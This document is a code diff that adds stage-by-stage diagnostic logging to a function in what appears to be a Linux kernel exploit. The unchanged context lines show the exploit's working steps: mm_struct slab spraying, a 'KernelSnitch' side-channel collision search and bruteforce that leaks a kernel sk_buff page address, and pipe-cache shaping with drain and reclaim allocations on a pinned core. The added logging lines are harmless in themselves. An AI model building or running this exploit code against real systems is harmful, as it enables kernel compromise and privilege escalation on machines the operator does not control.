@@ -148,6 +148,11 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=begin objects_per_slab=%zu\n",
+          objs_per_slab);
+#endif
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
@@ -162,8 +167,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=prep-spray-ready prep=%zu spray=%zu\n",
+          prep.mm_cnt, spray.mm_cnt);
+#endif
 
   setup_kernelsnitch();
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=kernelsnitch-ready\n");
+#endif
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
@@ -175,6 +189,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     post.memfds[i] = clone_memfd();
   }
   int leak_memfd = open_memfd(leak_child);
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=topology-ready pre=%zu post=%zu "
+          "leak_pid=%d\n",
+          pre.mm_cnt, post.mm_cnt, leak_child);
+#endif
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -186,6 +206,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     kill_child(spray.childs[i]);
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=collision-search-return\n");
+#endif
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
@@ -238,8 +262,22 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=bruteforce-enter\n");
+#endif
   run_kernelsnitch_bruteforce();
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=bruteforce-return\n");
+#endif
   uintptr_t leaked = cleanup_kernelsnitch();
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=kernelsnitch-cleanup-return "
+          "leaked=%016zx\n",
+          leaked);
+#endif
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
@@ -254,10 +292,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 #endif
 
   shape_pipe_cache();
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=pipe-cache-shaped\n");
+#endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=drain-allocated count=%d\n",
+          PIPE_DRAIN);
+#endif
 
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
@@ -265,6 +312,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     alloc_pipe_object(pipe_fds_reclaim[i]);
   }
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=reclaim-allocated count=%d\n",
+          PIPE_RECLAIM);
+  pr_info("p0 pipe page diagnostic stage=context-cleanup-enter\n");
+#endif
 
   close_ctx_memfds(&prep);
   close_ctx_memfds(&spray);
@@ -275,6 +328,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   free_ctx_storage(&pre);
   free_ctx_storage(&post);
   free(buf);
+#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
+    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
+  pr_info("p0 pipe page diagnostic stage=complete base=%016zx\n", base);
+#endif
   return base;
 }
 
